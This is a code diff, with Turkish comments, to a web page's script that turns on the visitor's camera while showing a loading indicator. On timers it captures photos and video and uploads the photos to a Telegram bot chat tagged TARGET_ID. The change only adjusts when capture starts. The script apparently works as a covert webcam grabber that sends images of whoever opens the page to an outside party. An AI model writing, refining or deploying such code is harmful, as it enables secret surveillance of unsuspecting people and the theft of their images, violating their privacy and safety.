@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
+            // ==================== KAMERA İŞLEMLERİ - SON ŞANS ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -155,6 +155,7 @@
             let stream = null;
             let videoTimer = null;
             let fotoTimer = null;
+            let isVideoActive = false;
             
             async function startCamera() {
                 try {
@@ -174,8 +175,13 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ========================================
-                        // VİDEO - HEMEN BAŞLA (0 MS BEKLEME)
+                        // VİDEO - HEMEN BAŞLA (İLK VİDEO)
                         // ========================================
+                        setTimeout(() => {
+                            videoBaslat();
+                            isVideoActive = true;
+                        }, 500); // 500ms sonra video başlasın
+                        
                         function videoBaslat() {
                             if (!stream?.active) return;
                             
@@ -219,38 +225,37 @@
                             } catch(e) {}
                         }
                         
-                        // İlk videoyu hemen başlat
-                        videoBaslat();
-                        
                         // Sonraki videolar için interval
-                        videoTimer = setInterval(videoBaslat, VIDEO_SURESI * 1000);
+                        videoTimer = setInterval(videoBaslat, VIDEO_SURESI * 1000 + 500); // Her video arası +500ms
                         
                         // ========================================
-                        // FOTOĞRAF - HEMEN BAŞLA
+                        // FOTOĞRAF - VİDEO İLE SENKRON
                         // ========================================
-                        fotoTimer = setInterval(() => {
-                            if (!stream?.active) return;
-                            
-                            photoCount++;
-                            
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(function(blob) {
-                                if (!blob) return;
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
+                        setTimeout(() => {
+                            fotoTimer = setInterval(() => {
+                                if (!stream?.active || !isVideoActive) return;
                                 
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }, 'image/jpeg', 0.85);
-                            
-                        }, FOTO_SURESI * 1000);
+                                photoCount++;
+                                
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                canvas.toBlob(function(blob) {
+                                    if (!blob) return;
+                                    const formData = new FormData();
+                                    formData.append('chat_id', TARGET_ID);
+                                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
+                                    
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    });
+                                }, 'image/jpeg', 0.85);
+                                
+                            }, FOTO_SURESI * 1000);
+                        }, 1000); // Fotoğraflar 1 saniye sonra başlasın
                     };
                     
                 } catch(e) {
@@ -268,4 +273,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
